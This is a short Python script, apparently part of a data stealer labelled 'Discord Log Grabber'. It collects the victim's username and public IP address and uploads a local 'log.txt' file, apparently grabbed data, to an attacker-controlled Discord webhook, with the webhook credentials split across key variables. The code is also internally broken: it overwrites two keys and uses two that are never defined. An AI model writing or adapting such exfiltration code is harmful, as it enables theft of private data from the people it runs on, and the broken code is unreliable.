from urllib.request import Request, urlopen
import discord
import os

def GetIP():
    ip = "Can't get IP"
    try:
        ip = urlopen(Request("https://api.ipify.org?format=text")).read().decode().strip()
    except:
        pass
    return ip.replace("\"", "")

key1 = '931710180'
key2 = '104740885'
key1 = 'cVX9D5mhe62PGxUtocAQmk6jju5M'
key2 = 'f0Yy5UyHYlYrWGpVE3d2UW-M-wv4gODup8EnRgkc'

webhook = discord.Webhook.partial(key1 + key2, key3 + key4, adapter=discord.RequestsWebhookAdapter())

with open(file='log.txt', mode='rb') as f:
    discord_file = discord.File(f)

webhook.send('Username: ' + os.getenv("UserName") + '\n' + "ip: " + GetIP() + '\n', username='Discord Log Grabber', avatar_url='https://i.ibb.co/c3P5DbN/Gigachad.png', file=discord_file)
